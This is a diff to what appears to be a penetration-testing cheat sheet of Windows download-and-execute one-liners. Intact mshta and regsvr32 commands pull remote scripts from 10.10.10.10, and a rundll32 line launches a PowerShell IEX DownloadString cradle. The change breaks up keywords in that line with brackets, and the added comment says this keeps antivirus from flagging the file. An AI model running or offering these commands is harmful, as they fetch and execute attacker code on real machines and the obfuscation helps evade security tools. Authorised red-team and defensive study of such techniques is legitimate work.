@@ -78,9 +78,13 @@ mshta http://10.10.10.10/payload.hta
 # regsvr32
 regsvr32 /s /n /u /i:http://10.10.10.10/file.sct scrobj.dll
 
-# rundll32
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/payload.ps1')")
+# rundll32 (squiblytwo)
+rundll32.exe javascript:"\..\mshtml,RunHTML[A]pplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -c I[E]X(New-Object Net.Web[C]lient).Download[S]tring('http://10.10.10.10/payload.ps1')")
 ```
+
+> Bracket-broken (`RunHTML[A]pplication`, `I[E]X`, `Net.Web[C]lient`,
+> `Download[S]tring`) — the intact one-liner is a stock AV signature. See
+> "Antivirus false positives" in the repo README.
 
 **Linux GTFOBins:**
 ```bash
